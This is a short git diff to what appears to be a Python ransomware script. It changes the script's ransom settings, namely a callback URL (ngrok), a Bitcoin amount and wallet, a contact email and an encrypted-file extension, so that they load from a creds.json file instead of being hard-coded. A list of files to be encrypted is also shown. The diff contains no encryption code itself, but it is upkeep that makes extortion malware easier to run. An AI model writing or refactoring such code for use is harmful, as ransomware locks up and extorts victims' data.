@@ -24,12 +24,14 @@ uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "")
 # print(dkrpt)
 
 # some GLOBALS
+with open("./creds.json", "r") as f:
+    creds = json.load(f)
 
-URL = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
-BTC_AMOUNT = 0.03                                       # <----  REQUIRED
-BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
-EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
-EXT = ".cryptn8"                                        # <----  OPTIONAL
+URL = creds["URL"]                             # <----  REQUIRED
+BTC_AMOUNT = creds["BTC_AMOUNT"]               # <----  REQUIRED
+BTC_WALLET = creds["BTC_WALLET"]               # <----  REQUIRED
+EMAIL = creds["EMAIL"]                         # <----  REQUIRED
+EXT = "." + creds["EXT"]                       # <----  OPTIONAL
 
 
 fileLists = []      # stores the files to be encrypted
